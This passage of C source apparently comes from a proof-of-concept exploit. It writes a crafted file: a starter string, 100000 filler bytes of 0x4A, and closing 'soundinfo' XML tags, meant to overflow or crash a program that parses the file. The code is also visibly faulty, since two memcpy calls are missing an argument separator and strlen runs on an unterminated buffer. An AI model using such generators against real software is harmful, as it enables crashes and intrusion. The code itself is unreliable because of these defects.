    0x3C, 0x2F, 0x61, 0x74, 0x74, 0x72, 0x69, 0x62, 0x75, 0x74, 0x65, 0x3E, 0x0A, 0x20, 0x20, 0x3C,
    0x2F, 0x61, 0x74, 0x74, 0x72, 0x69, 0x62, 0x75, 0x74, 0x65, 0x73, 0x3E, 0x0A, 0x0A, 0x3C, 0x2F,
    0x73, 0x6F, 0x75, 0x6E, 0x64, 0x69, 0x6E, 0x66, 0x6F, 0x3E, 0x0A };
 
int main(int argc, char *argv[])
{
 
    banner();
 
    char payload[PSIZE];
    char input[100000];
 
    memset(input,0x4A,100000);
 
    memcpy(payload,starter,strlen(starter));
    memcpy(payload+strlen(starter),input,strlen(input));
    memcpy(payload+strlen(starter)+strlen(input)+body,strlen(body));
    memcpy(payload+strlen(starter)+strlen(input)+strlen(body)+tail,strlen(tail));
 
    fp = fopen(FN,"wb");
 
    if(fp==NULL)
    {
        perror ("Oops! Can't open file.\n");
    }
 
    fwrite(payload,1,sizeof(payload),fp);
 
    fclose(fp);
 
    sleep(1);
 
    printf("\nDone!\n");
    printf("File %s created!\n", FN);
 
    return 0;
}
